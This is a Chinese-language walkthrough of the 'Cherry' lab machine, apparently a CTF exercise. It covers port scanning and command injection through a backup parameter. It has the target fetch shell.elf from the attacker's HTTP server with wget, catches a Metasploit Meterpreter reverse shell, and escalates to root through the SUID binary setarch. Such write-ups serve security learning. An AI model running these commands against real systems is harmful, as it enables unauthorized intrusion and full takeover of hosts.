# Cherry 靶机实战

## 一、靶机信息

| 项目       | 信息                           |
| ---------- | ------------------------------ |
| 靶机名称   | Cherry                         |
| 靶机 IP    | `172.20.10.2`                  |
| 攻击机 IP  | `172.20.10.3`                  |
| 开放端口   | 22、80、7755、33060            |
| Web 服务   | Nginx 1.18.0、Apache 2.4.41    |
| SSH        | OpenSSH 8.2p1                  |
| 数据库服务 | MySQL X Protocol               |
| 最终结果   | 获取 root 权限，读取 proof.txt |

## 二、信息收集

### 1. Nmap 端口扫描

```
nmap -sV 172.20.10.2
```

扫描结果：

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1
80/tcp    open  http    nginx 1.18.0 (Ubuntu)
7755/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
33060/tcp open  mysqlx  MySQL X protocol listener
```

初步分析：

- 22：SSH 远程登录服务。
- 80：Nginx Web 服务。
- 7755：Apache Web 服务，值得重点探测。
- 33060：MySQL X Protocol 服务。

<img src=".\images\01.png" alt="01" style="zoom:33%;" />

<img src=".\images\02.png" alt="01" style="zoom:33%;" />



### 2. 获取网站绝对路径

访问：

```
http://172.20.10.2:7755/info.php
```

获取网站根目录：

```
/var/www/html
```

## 三、Web 漏洞利用

### 1. 发现命令执行入口

访问：

```
http://172.20.10.2:7755/backup/command.php?backup=id
```

通过 `backup` 参数传递 `id` 命令，发现服务器存在命令执行漏洞。

<img src=".\images\03.png" alt="01" style="zoom:33%;" />

### 2. 准备反弹 Shell

攻击机开启 HTTP 服务，将本地 ELF 文件提供给靶机下载。

```
python3 -m http.server 80
```

### 3. 靶机下载 ELF 文件

利用命令执行漏洞，让靶机执行：

```
wget -P /tmp http://172.20.10.3/shell.elf
```

文件下载到：

```
/tmp/shell.elf
```

<img src=".\images\04.png" alt="01" style="zoom:33%;" />

### 4. Metasploit 监听

攻击机使用 Handler 模块监听。

```
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 172.20.10.3
set LPORT 1234
exploit
```

靶机执行 ELF 文件后，攻击机成功获得 Meterpreter 会话。

<img src=".\images\05.png" alt="01" style="zoom:33%;" />

## 四、Linux 本地提权

### 1. SUID 文件枚举

进入 Shell，执行：

```
find / -perm -u=s -type f 2>/dev/null
```

参数说明：

| 参数          | 含义                       |
| ------------- | -------------------------- |
| `/`           | 从根目录开始搜索           |
| `-perm -u=s`  | 查找设置了 SUID 权限的文件 |
| `-type f`     | 只查找普通文件             |
| `2>/dev/null` | 忽略权限不足产生的错误     |

发现 `setarch`，进一步判断其是否存在可利用的提权方式。

### 2. setarch 提权

执行：

```
setarch -3 /bin/sh -p
```

参数说明：

- `setarch`：修改进程运行时的执行域或架构相关属性。
- `-3`：启用地址空间布局随机化相关的兼容模式选项（ADDR_NO_RANDOMIZE）。
- `/bin/sh`：启动 Shell。
- `-p`：使 Shell 在特权模式下运行，避免主动丢弃有效权限。

在该靶机的 SUID 配置和系统环境下，成功利用该方式获得高权限 Shell。

<img src=".\images\06.png" alt="01" style="zoom:33%;" />

### 3. 验证权限

```
id
whoami
```

确认获得 root 权限。

## 五、获取最终 Flag

进入 root 目录：

```
cd /root
ls
```

发现：

```
proof.txt
snap
```

读取 Flag：

```
cat proof.txt
```

最终结果：

```
Sun_CSR_TEAM.af6d45da1f1181347b9e2139f23c6a5b
```

## 六、最终攻击路径

```
Nmap 端口扫描
       |
       v
发现 7755 Apache 服务
       |
       v
info.php 获取网站绝对路径
       |
       v
command.php 参数命令执行
       |
       v
wget 下载 shell.elf
       |
       v
Metasploit Handler 监听
       |
       v
获取 Meterpreter Shell
       |
       v
find 枚举 SUID 文件
       |
       v
发现 setarch
       |
       v
setarch -3 /bin/sh -p
       |
       v
获取 root 权限
       |
       v
读取 /root/proof.txt
```

## 七、关键命令整理

| 功能           | 命令                                        |
| -------------- | ------------------------------------------- |
| 端口扫描       | `nmap -sV 172.20.10.2`                      |
| 开启 HTTP 服务 | `python3 -m http.server 80`                 |
| 下载文件       | `wget -P /tmp http://172.20.10.3/shell.elf` |
| SUID 枚举      | `find / -perm -u=s -type f 2>/dev/null`     |
| setarch 提权   | `setarch -3 /bin/sh -p`                     |
| 查看权限       | `id && whoami`                              |
| 查看 Flag      | `cat /root/proof.txt`                       |

## 八、实战总结

本次 Cherry 靶机主要涉及：

1. **多端口信息收集**：识别 SSH、Nginx、Apache 和 MySQL X Protocol。
2. **Web 信息收集**：通过 info.php 获取网站绝对路径。
3. **命令执行漏洞**：利用 command.php 的 backup 参数执行系统命令。
4. **文件传输**：使用 Python HTTP 服务和 wget 完成 ELF 文件传输。
5. **反弹 Shell**：使用 Metasploit Handler 获取 Meterpreter 会话。
6. **SUID 提权**：枚举具有 SUID 权限的文件，发现 setarch。
7. **Linux 权限机制**：利用 setarch 与 Shell 特权模式获得 root 权限。

### 个人复盘

本次重点掌握：

- Web 命令执行漏洞如何进一步转化为系统 Shell。
- 攻击机开启 HTTP 服务，靶机使用 wget 下载文件。
- Meterpreter 获取会话后，如何继续进行 Linux 本地提权。
- SUID 文件枚举不仅要看文件名称，还要结合具体程序的功能和权限进行分析。
- `setarch -3 /bin/sh -p` 的利用思路及参数含义。

**核心知识点：命令执行、文件传输、Meterpreter、SUID、setarch 提权。**